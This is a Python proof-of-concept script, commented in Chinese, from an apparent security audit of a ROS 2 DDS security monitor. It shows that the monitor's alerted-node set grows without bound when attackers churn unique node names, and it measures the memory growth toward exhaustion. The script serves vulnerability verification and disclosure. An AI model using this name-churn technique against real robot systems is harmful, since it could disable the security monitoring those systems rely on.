#!/usr/bin/env python3
"""攻擊 N18 — _alerted_nodes 無上限成長記憶體耗盡（量化 PoC）.

直接驅動「真實」DDSSecurityMonitor._check_graph()，不靠 ROS spin。
做法：monkeypatch get_node_names_and_namespaces 每次 poll 回傳一批「全新唯一名字」，
模擬攻擊者用 spawn→kill→換名 churn。測 _alerted_nodes 大小 + tracemalloc 記憶體。

漏洞（monitor_node.py:502-514）：
    _alerted_nodes.add(node_full)              # 每個唯一名字都 add
    if self._alert_on_exit:                    # 預設 False
        ... _alerted_nodes.discard(node_full)  # 預設永不執行
→ 預設 config 下 _alerted_nodes 只增不減 → churn 唯一名字 → OOM
"""
import sys
import os
import tracemalloc

sys.path.insert(0, os.path.expanduser(
    '~/ros2_ws/install/dds_security_monitor/lib/python3.12/site-packages'))

import rclpy
from dds_security_monitor.monitor_node import DDSSecurityMonitor


POLLS = 200          # 模擬幾次 poll
NEW_PER_POLL = 50    # 每次 poll 攻擊者換上的唯一名字數


def main():
    rclpy.init(args=None)
    # 預設 config：emergency_stop 關掉避免 timer 噪音；alert_on_node_exit 預設 False
    node = DDSSecurityMonitor()
    # 關掉 logger 噪音（每個假節點都會 warn）
    node.get_logger().set_level(50)  # FATAL only

    # baseline 初始化（第一次 poll 走 init 分支）
    node.get_node_names_and_namespaces = lambda: [('dds_security_monitor', '/')]
    node._check_graph()

    tracemalloc.start()
    base_mem = tracemalloc.get_traced_memory()[0]
    base_set = len(node._alerted_nodes)

    print(f"{'poll':>5} {'_alerted_nodes':>16} {'mem_growth_KB':>14}")
    counter = 0
    for p in range(1, POLLS + 1):
        # 攻擊者：這次 poll 全是「沒見過的」唯一名字（上次的都 kill 掉了）
        batch = []
        for _ in range(NEW_PER_POLL):
            counter += 1
            batch.append((f'evil_{counter}_{os.getpid()}', '/'))
        node.get_node_names_and_namespaces = lambda b=batch: list(b)
        node._check_graph()
        if p % 40 == 0 or p == 1:
            cur_mem = tracemalloc.get_traced_memory()[0]
            print(f"{p:>5} {len(node._alerted_nodes):>16} "
                  f"{(cur_mem - base_mem)/1024:>14.1f}")

    final_set = len(node._alerted_nodes)
    cur_mem = tracemalloc.get_traced_memory()[0]
    print()
    print(f"churn 唯一名字總數: {counter}")
    print(f"_alerted_nodes 起始={base_set} 結束={final_set} "
          f"(成長 {final_set - base_set})")
    print(f"記憶體成長: {(cur_mem - base_mem)/1024:.1f} KB "
          f"({(cur_mem - base_mem)/max(1,counter):.1f} bytes/node)")
    if final_set >= counter * 0.99:
        print("✗✗✗ N18 確認：每個唯一名字都永久留在 _alerted_nodes，"
              "discard 從不執行（alert_on_node_exit 預設 False）→ 無上限成長")
        print(f"    外推：1 名/秒 churn × 24h = 86400 entries；"
              f"持續數天 → monitor OOM")
    else:
        print("？ _alerted_nodes 有縮減，N18 可能已修補")

    tracemalloc.stop()
    node.destroy_node()
    rclpy.shutdown()


if __name__ == '__main__':
    main()
